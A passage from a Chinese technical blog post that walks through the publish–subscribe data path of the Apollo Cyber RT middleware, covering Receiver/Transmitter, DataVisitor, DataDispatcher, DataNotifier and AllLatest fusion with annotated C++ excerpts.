<code>DataNotifier::Notify()</code> ，唤醒对应的 <code>Component</code> 的封装了 <code>Process()</code> 的协程，让协程处理这些消息。</p><p>再看看 <code>Receiver</code> 的四个子类，每个子类都包含了相应的 Dispatcher 的指针，例如，<code>RtpsReceiver</code> 类含有 <code>RtpsDispatcherPtr</code> 成员。这些 Dispatcher 的功能就是增删监听者，从而让 <code>Receiver</code> 关闭或开启，比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-type">void</span> RtpsReceiver&lt;M&gt;::<span class="hljs-built_in">Enable</span>() &#123;<br> <span class="hljs-comment">/*  ....  */</span><br>  dispatcher_-&gt;<span class="hljs-built_in">AddListener</span>&lt;M&gt;(<br>      <span class="hljs-keyword">this</span>-&gt;attr_, std::<span class="hljs-built_in">bind</span>(&amp;RtpsReceiver&lt;M&gt;::OnNewMessage, <span class="hljs-keyword">this</span>,<br>                             std::placeholders::_1, std::placeholders::_2));<br>  <span class="hljs-keyword">this</span>-&gt;enabled_ = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-type">void</span> RtpsReceiver&lt;M&gt;::<span class="hljs-built_in">Disable</span>() &#123;<br>  dispatcher_-&gt;<span class="hljs-built_in">RemoveListener</span>&lt;M&gt;(<span class="hljs-keyword">this</span>-&gt;attr_);<br>  <span class="hljs-keyword">this</span>-&gt;enabled_ = <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单地介绍一下 <code>Dispatcher</code> 类（别和下面的 <code>DataDispatcher</code> 搞混了）。它主要负责记录一个 <code>channel_id</code> 和对应 <code>ListenerHandlerBasePtr</code> 的关系表。而<code>AddListener()</code> 和 <code>RemoveListener()</code> 函数是从关系表中，拿到给定信道的对应 <code>ListenerHandlerBase</code> ，并在这上面连接（Connect）或不连接（Disconnect）相应的回调函数。由于时间精力有限，这边解释得比较混乱，若想具体了解其工作机制，可以参考文章最后的文献。总的来说，这有点像在 <a href="https://www.qt.io/cn">Qt</a> 中实现的信号槽机制：信号在特定情况下被发射出去，对应的信号响应函数在槽中监听。信号与槽通过 Connect 函数关联，一个信号可以发射到多个槽，多个信号可以被一个槽监听。</p><hr><p>再来看看 <code>Transmitter</code> 类，它是真正的数据写者的基类。它有两个成员，分别为序列号 <code>seq_num_</code> 和消息信息 <code>msg_info_</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transmitter</span> : <span class="hljs-keyword">public</span> Endpoint &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Transmitter</span><span class="hljs-params">(<span class="hljs-type">const</span> RoleAttributes&amp; attr)</span></span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">bool</span> <span class="hljs-title">Transmit</span><span class="hljs-params">(<span class="hljs-type">const</span> MessagePtr&amp; msg)</span></span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">bool</span> <span class="hljs-title">Transmit</span><span class="hljs-params">(<span class="hljs-type">const</span> MessagePtr&amp; msg, <span class="hljs-type">const</span> MessageInfo&amp; msg_info)</span> </span>= <span class="hljs-number">0</span>;<br><br>  <span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">NextSeqNum</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> ++seq_num_; &#125;<br>  <span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">seq_num</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> seq_num_; &#125;<br> <span class="hljs-keyword">protected</span>:<br>  <span class="hljs-type">uint64_t</span> seq_num_;<br>  MessageInfo msg_info_;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>我主要研究其中的 <code>Transmit()</code> 函数，其四个子类都具体实现了 <code>Transmit()</code> 函数，如果你仔细看过前一篇博客，就知道这也是 <code>Writer</code> 类一直在调用的函数。那么这个 <code>Transmit()</code> 函数有什么具体步骤呢？</p><ul><li><code>Writer</code> 调用 <code>Transmitter::Transmit()</code> 函数</li><li>设置 <code>msg_info::seq_num = NextSeqNum</code> 消息的序列号</li><li>加入一个 Transport事件，类型为 Transmit Begin</li><li>调用子类实现的 <code>Transmit()</code> 函数，该函数通过传入一条消息即可以完成数据写入任务。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-type">bool</span> Transmitter&lt;M&gt;::<span class="hljs-built_in">Transmit</span>(<span class="hljs-type">const</span> MessagePtr&amp; msg) &#123;<br>  msg_info_.<span class="hljs-built_in">set_seq_num</span>(<span class="hljs-built_in">NextSeqNum</span>());<br>  PerfEventCache::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">AddTransportEvent</span>(<br>      TransPerf::TRANSMIT_BEGIN, attr_.<span class="hljs-built_in">channel_id</span>(), msg_info_.<span class="hljs-built_in">seq_num</span>());<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Transmit</span>(msg, msg_info_);<br>&#125;<br></code></pre></td></tr></table></figure><p>好，我对 <code>Receiver</code> 和 <code>Transmitter</code> 类的介绍就到这里了。我不打算再继续介绍它们的子类以及更加底层的设计是如何实现的，因为这边牵扯到非常多的技术细节，弄懂这些会消耗非常多的精力，而且这些东西也远远超出了课题组目前的要求。</p><h2 id="Data-部分">Data 部分</h2><p>通信架构的内容已经全部介绍完了（至少对于发布—订阅通信方式来说），但还是感觉缺了什么东西，把这两者有效地连接起来😅。没错，我至今还没有说清楚，<code>Writer</code> 发布的消息是如何让 <code>Reader</code> 看到的。而这就牵扯到 <code>cyber/data</code> 中实现的类了。</p><h3 id="DataVisitor">DataVisitor</h3><p>先来说说数据访问类 <code>DataVisitor</code> ，它是 <code>DataVisitorBase</code> 的子类。它的主要成员和构造函数如下。先来说几个明显可以得到的结论：</p><ul><li><code>DataVisitor</code> 对象都会有若干个缓存类 <code>ChannelBuffer</code> ，还有一个 <code>DataFusion</code> 对象，融合了所有的消息类型</li><li>在初始化的时候，首先构建这些 <code>ChannelBuffer</code> ，然后它们都会被加入到<strong>相应类型</strong>的 <code>DataDispatcher</code> 的管理中</li><li><code>data_notifier_</code> （存在于 <code>DataVisitorBase</code> 中），会向信道 0 加入一个 <code>notifier_</code> ，类型为 <code>struct Notifier &#123; std::function&lt;void()&gt; callback; &#125;;</code>，这表明信道 0 注定与其他信道不一般 :thinking:</li><li><code>data_fusion_</code> 会构建并指向 <code>AllLatest</code> 对象，从类型来看，它们整合了所有的消息类型，应当用于信息的最后收集发送</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataVisitor</span>&lt;M0, M1, NullType, NullType&gt; : <span class="hljs-keyword">public</span> DataVisitorBase &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">DataVisitor</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;VisitorConfig&gt;&amp; configs)</span></span><br><span class="hljs-function">      : buffer_m0_(configs[<span class="hljs-number">0</span>].channel_id, new BufferType&lt;M0&gt;(configs[<span class="hljs-number">0</span>].queue_size)),</span><br><span class="hljs-function">     buffer_m1_(configs[<span class="hljs-number">1</span>].channel_id, new BufferType&lt;M1&gt;(configs[<span class="hljs-number">1</span>].queue_size)) &#123;</span><br>    DataDispatcher&lt;M0&gt;::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">AddBuffer</span>(buffer_m0_);<br>    DataDispatcher&lt;M1&gt;::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">AddBuffer</span>(buffer_m1_);<br>    data_notifier_-&gt;<span class="hljs-built_in">AddNotifier</span>(buffer_m0_.<span class="hljs-built_in">channel_id</span>(), notifier_);<br>    data_fusion_ = <span class="hljs-keyword">new</span> fusion::<span class="hljs-built_in">AllLatest</span>&lt;M0, M1&gt;(buffer_m0_, buffer_m1_);<br>  &#125;<br> <span class="hljs-keyword">private</span>:<br>  fusion::DataFusion&lt;M0, M1&gt;* data_fusion_ = <span class="hljs-literal">nullptr</span>;<br>  ChannelBuffer&lt;M0&gt; buffer_m0_;<br>  ChannelBuffer&lt;M1&gt; buffer_m1_;<br>&#125;;<br><br><span class="hljs-comment">/** DataVisitorBase 内有</span><br><span class="hljs-comment"> * 指向 DataNotifier 的指针</span><br><span class="hljs-comment"> * 封装为 Notifier 的回调函数  */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataVisitorBase</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RegisterNotifyCallback</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>()&gt;&amp;&amp; callback)</span> </span>&#123;<br>    notifier_-&gt;callback = callback;<br>  &#125;<br> <span class="hljs-keyword">protected</span>:<br>  <span class="hljs-type">uint64_t</span> next_msg_index_ = <span class="hljs-number">0</span>;<br>  DataNotifier* data_notifier_ = DataNotifier::<span class="hljs-built_in">Instance</span>();<br>  std::shared_ptr&lt;Notifier&gt; notifier_;<br>&#125;;<br></code></pre></td></tr></table></figure><p><em>该类主要用于消息数据的访问，存放到来的消息数据，并提供接口供消息读取</em>。事实上，我们之前在讨论<a href="https://dingfen.github.io/apollo/2020/10/25/CyberComponent.html#%E7%9C%9F%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%A8%A1%E6%8B%9F%E6%A8%A1%E5%BC%8F">组件的初始化的最后部分时</a>见过它，也在<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html#reader-%E7%B1%BB">订阅者初始化时遇见过它</a>，但当时我都有意地略过了。现在我们重拾这部分内容（为了简单且不失一般性，我以两个信道的情况为例），把这部分彻底搞明白：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1&gt;<br><span class="hljs-type">bool</span> Component&lt;M0, M1, NullType, NullType&gt;::<span class="hljs-built_in">Initialize</span>() &#123;<br>   <span class="hljs-comment">/*   ....   */</span><br>  <span class="hljs-comment">// 创建 DataVisitor 和 RoutineFactory   最后创建任务</span><br>  std::vector&lt;data::VisitorConfig&gt; config_list;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; reader : readers_)<br>    config_list.<span class="hljs-built_in">emplace_back</span>(reader-&gt;<span class="hljs-built_in">ChannelId</span>(), reader-&gt;<span class="hljs-built_in">PendingQueueSize</span>());<br>   <span class="hljs-comment">// 创建了两个信道的 DataVisitor 并用在了协程工厂类</span><br>  <span class="hljs-keyword">auto</span> dv = std::make_shared&lt;data::DataVisitor&lt;M0, M1&gt;&gt;(config_list);<br>  croutine::RoutineFactory factory = croutine::<span class="hljs-built_in">CreateRoutineFactory</span>&lt;M0, M1&gt;(func, dv);<br>  <span class="hljs-keyword">return</span> sched-&gt;<span class="hljs-built_in">CreateTask</span>(factory, node_-&gt;<span class="hljs-built_in">Name</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码做了：</p><ul><li><p>收集了所有的 <code>Reader</code> 对象的所读信道 id 和消息队列大小，放入到 <code>config_list</code> 后就创建 <code>DataVisitor</code> 对象</p></li><li><p>在上面 <code>DataVisitor</code> 类的构造函数中，根据传入的信道 id 和消息队列尺寸，<code>DataVisitor</code> 内为其创建了两个 <code>ChannelBuffer</code> 作为缓冲区</p><ul><li>调用数据分发器将它们加入到 <code>DataDispatcher</code> 的管理中</li><li>调用 <code>DataNotifier::AddNotifier()</code> 函数，传入第 0 个读者的信道 id ，加入到 <code>DataNotifier</code> 的管理中。<code>DataDispatcher</code> 与 <code>DataNotifier</code> 类均为单例，之后我们会对它们做详细介绍</li><li>创建 <code>DataFusion</code> 对象，这也是之后要了解的╮(╯▽╰)╭</li></ul></li><li><p>创建协程工厂，并构建出要封装为协程的函数：</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">factory.create_routine = [=]() &#123;<br><span class="hljs-keyword">return</span> [=]() &#123;<br>  std::shared_ptr&lt;M0&gt; msg0;     std::shared_ptr&lt;M1&gt; msg1;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    CRoutine::<span class="hljs-built_in">GetCurrentRoutine</span>()-&gt;<span class="hljs-built_in">set_state</span>(RoutineState::DATA_WAIT);<br>    <span class="hljs-keyword">if</span> (dv-&gt;<span class="hljs-built_in">TryFetch</span>(msg0, msg1)) &#123;  <span class="hljs-comment">// 取数据</span><br>      <span class="hljs-built_in">f</span>(msg0, msg1);<span class="hljs-comment">// f 函数就是组件初始化时创建的 func 函数</span><br>      CRoutine::<span class="hljs-built_in">Yield</span>(RoutineState::READY);<br>    &#125; <span class="hljs-keyword">else</span><br>      CRoutine::<span class="hljs-built_in">Yield</span>();<br>  &#125;<br>&#125;; &#125;;<br></code></pre></td></tr></table></figure><p>协程做的就是调用 <code>dv-&gt;TryFetch()</code> 取数据（下文会详细说明），如果成功就调用组件的 <code>Process()</code> 函数，且协程的状态从等待数据转变为了就绪，而一旦协程就绪，就可以被 <code>Processor</code> 类运行</p></li><li><p><code>Scheduler</code> 创建任务，在<code>CreateTask()</code> 函数中，调用 <code>visitor-&gt;RegisterNotifyCallback()</code> 函数</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">visitor-&gt;<span class="hljs-built_in">RegisterNotifyCallback</span>([<span class="hljs-keyword">this</span>, task_id]() &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>()))<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">NotifyProcessor</span>(task_id);<br>&#125;);<br></code></pre></td></tr></table></figure><p>上面的函数被赋值给了 <code>DataVisitorBase::notifier_</code> ，用于唤醒相应的协程来处理该新消息</p></li></ul><p>说完这部分过程后，我发现我们至少还要理解一下 <code>DataDispatcher</code> 、 <code>DataNotifier</code> 、 <code>DataFusion</code> 和 <code>AllLatest</code> 类😂😂😂。</p><h3 id="DataDispatcher">DataDispatcher</h3><p>千里之行，始于足下。先来看看数据分发类 <code>DataDispatcher</code> ，顾名思义，它将底层传来的数据进行分发，具体来说，当新消息到来时，通过 <code>Dispatch()</code> 函数把它们放到该信道下的所有消息缓冲区中。它是个单例模式，但是个模板类，意味着每一个消息类型会有对应的一个唯一的 <code>DataDispatcher</code> 对象。类内记录了一个信道 id 与多个 <code>CacheBuffer</code> 对象对应的表。注意到：一个信道可以有多个订阅者 <code>Reader</code> ，每个订阅者拥有一个 <code>CacheBuffer</code> 缓冲区，而这个缓冲区就是之前 <code>DataVisitor</code> 类在构造时给每个消息类型创建的 <code>ChannelBuffer</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataDispatcher</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddBuffer</span><span class="hljs-params">(<span class="hljs-type">const</span> ChannelBuffer&lt;T&gt;&amp; channel_buffer)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Dispatch</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> channel_id, <span class="hljs-type">const</span> std::shared_ptr&lt;T&gt;&amp; msg)</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  DataNotifier* notifier_ = DataNotifier::<span class="hljs-built_in">Instance</span>();<br>  AtomicHashMap&lt;<span class="hljs-type">uint64_t</span>, BufferVector&gt; buffers_map_;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-type">bool</span> DataDispatcher&lt;T&gt;::<span class="hljs-built_in">Dispatch</span>(<span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> channel_id,<br>                                 <span class="hljs-type">const</span> std::shared_ptr&lt;T&gt;&amp; msg) &#123;<br>  BufferVector* buffers = <span class="hljs-literal">nullptr</span>;<br>  <span class="hljs-keyword">if</span> (apollo::cyber::<span class="hljs-built_in">IsShutdown</span>())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-comment">// 每次收到该信道的消息时，就会给所有缓冲区都放一份消息</span><br>  <span class="hljs-keyword">if</span> (buffers_map_.<span class="hljs-built_in">Get</span>(channel_id, &amp;buffers)) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; buffer_wptr : *buffers)<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> buffer = buffer_wptr.<span class="hljs-built_in">lock</span>()) &#123;<br>        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(buffer-&gt;Mutex())</span></span>;<br>       <span class="hljs-comment">// 向 CacheBuffer 填入数据</span><br>        buffer-&gt;<span class="hljs-built_in">Fill</span>(msg);<br>      &#125;<br>  &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> notifier_-&gt;<span class="hljs-built_in">Notify</span>(channel_id);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DataDispatcher::Dispatch()</code> 函数非常重要，在 <a href="#1">ReceiverManager</a> 和 <a href="#2">Receiver &amp;&amp; Transmitter</a> 中我们已经提到，他是连接上层和底层的最关键一环。在 <code>Receiver</code> 对象每次收到该信道的消息时，就会调用<code>DataDispatcher::Dispatch()</code> 函数分发刚收到的数据，函数会先从表中取出所有对应信道的缓冲区，然后调用 <code>CacheBuffer::Fill()</code> 函数来给缓冲区填数据（稍后介绍这个函数），最后调用 <code>DataNotifier::Notify()</code> 函数，唤醒它们对应的协程来取数据并运行。现在你应该明白，为何 <code>DataVisitor</code> 在构造时，需要把刚刚建立的缓冲区给 <code>DataDispatcher</code> 管理，不然的话，缓冲区拿不到消息啊。</p><h3 id="DataNotifier">DataNotifier</h3><p>再来看看 <code>DataNotifier</code> 类。它是个单例模式，类内有一个信道 id 与多个 <code>Notifer</code> 对应的表，这是考虑到一个信道可以有多个订阅者。很显然，前文提到的在 <code>DataVisitor</code> 构造时，调用 <code>AddNotifier()</code> 就是要把自己的 <code>Notifier</code> 存到这个表中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataNotifier</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddNotifier</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> channel_id, <span class="hljs-type">const</span> std::shared_ptr&lt;Notifier&gt;&amp; notifier)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Notify</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> channel_id)</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  AtomicHashMap&lt;<span class="hljs-type">uint64_t</span>, NotifyVector&gt; notifies_map_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>至于 <code>AddNotifier()</code> 函数的实现，emm……很平凡，无非就是找到对应的信道 id ，然后将参数中的 <code>Notifier</code> 放入到数组里（如果没有数组，新建一个）。重要的是唤醒函数 <code>Notify()</code> ，该函数内部会调用 <code>notifier-&gt;callback()</code> ，回顾一下，这个 <code>notifier</code> 是在 <code>Scheduler</code> 创建任务时被设置的，内含有 <code>NotifyProcessor()</code> 函数，可以唤醒协程。在 <a href="#2">Receiver &amp;&amp; Transmitter</a> 和 <a href="#1">ReceiverManager</a> 也提到，第二步的分发器最终会调用该函数，唤醒所有监听该信道的协程，来处理到来的消息。这样，你也就明白为什么 <code>DataVisitor</code> 类在构造时要把 <code>notifier</code> 加入进去了，不然的话信道来了个消息，就没法唤醒协程，<code>Reader</code> 就不知道了呀。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">DataNotifier::Notify</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> channel_id)</span> </span>&#123;<br>  NotifyVector* notifies = <span class="hljs-literal">nullptr</span>;<br>  <span class="hljs-keyword">if</span> (notifies_map_.<span class="hljs-built_in">Get</span>(channel_id, &amp;notifies)) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; notifier : *notifies)<br>      <span class="hljs-keyword">if</span> (notifier &amp;&amp; notifier-&gt;callback)<br>        notifier-&gt;<span class="hljs-built_in">callback</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DataFusion-AllLatest">DataFusion &amp; AllLatest</h3><p>再来看看 <code>DataVisitor</code> 构造函数的最后一步，创建 <code>DataFusion</code> 对象，看看名字，就应该明白该对象用于信道数据的融合。<code>DataFusion</code> 是 <code>AllLatest</code> 的基类，<code>DataFusion</code> 类十分简单，仅提供了一个 <code>Fusion()</code> 接口，具体由 <code>AllLatest</code> 实现。所以，我们重点看一下 <code>AllLatest</code> 类，哈，听名字就知道它会取所有信道中的<strong>最新值</strong>，再结合它是 <code>DataFusion</code> 的子类，所以主要功能应该是<strong>融合多个信道的最新数据</strong>。</p><p>我还是以两个信道的情况为例，该类成员有几个 <code>ChannelBuffer</code> 类，其中一个比较特殊，类型是数据融合的 <code>buffer_fusion_</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AllLatest</span>&lt;M0, M1, NullType, NullType&gt; : <span class="hljs-keyword">public</span> DataFusion&lt;M0, M1&gt; &#123;<br>     <span class="hljs-comment">// 所谓融合消息，就是放在 tuple 里</span><br> <span class="hljs-keyword">using</span> FusionDataType = std::tuple&lt;std::shared_ptr&lt;M0&gt;, std::shared_ptr&lt;M1&gt;&gt;;<br> <span class="hljs-keyword">private</span>:<br>  ChannelBuffer&lt;M0&gt; buffer_m0_;<br>  ChannelBuffer&lt;M1&gt; buffer_m1_;<br>  ChannelBuffer&lt;FusionDataType&gt; buffer_fusion_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在构造函数中，特殊的信道 0 的消息缓冲区会调用 <code>SetFusionCallback()</code> 来设置<strong>回调函数</strong> :point_down:，<em>为方便表述，我给它起名 <code>FusionFunc</code></em> 。从下面的代码中看出， <code>FusionFunc</code> 先判断是否所有信道都有消息，并获取最新的消息，如果都有消息的话就将这些消息融合，即用 <code>std::tuple</code> 封装，再调用 <code>Fill()</code> 函数填入到 <code>buffer_fusion_</code> 的 <code>CacheBuffer</code> 中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">AllLatest</span>(<span class="hljs-type">const</span> ChannelBuffer&lt;M0&gt;&amp; buffer_0, <span class="hljs-type">const</span> ChannelBuffer&lt;M1&gt;&amp; buffer_1)<br>      : <span class="hljs-built_in">buffer_m0_</span>(buffer_0), <span class="hljs-built_in">buffer_m1_</span>(buffer_1),<br>        <span class="hljs-built_in">buffer_fusion_</span>(buffer_m0_.<span class="hljs-built_in">channel_id</span>(),<br>           <span class="hljs-keyword">new</span> CacheBuffer&lt;std::shared_ptr&lt;FusionDataType&gt;&gt;(<br>              buffer_0.<span class="hljs-built_in">Buffer</span>()-&gt;<span class="hljs-built_in">Capacity</span>() - <span class="hljs-built_in">uint64_t</span>(<span class="hljs-number">1</span>))) &#123;<br>    buffer_m0_.<span class="hljs-built_in">Buffer</span>()-&gt;<span class="hljs-built_in">SetFusionCallback</span>( <span class="hljs-comment">// buffer0 设置融合的回调函数</span><br>        [<span class="hljs-keyword">this</span>](<span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; m0) &#123;<br>          std::shared_ptr&lt;M1&gt; m1;<br>          <span class="hljs-keyword">if</span> (!buffer_m1_.<span class="hljs-built_in">Latest</span>(m1)) <span class="hljs-comment">// 信道内是否有消息 有的话取出最后一个</span><br>            <span class="hljs-keyword">return</span>;<br>          <span class="hljs-keyword">auto</span> data = std::<span class="hljs-built_in">make_shared</span>&lt;FusionDataType&gt;(m0, m1);<br>          std::lock_guard&lt;std::mutex&gt; <span class="hljs-built_in">lg</span>(buffer_fusion_.<span class="hljs-built_in">Buffer</span>()-&gt;<span class="hljs-built_in">Mutex</span>());<br>          <span class="hljs-comment">// 填充到消息中</span><br>          buffer_fusion_.<span 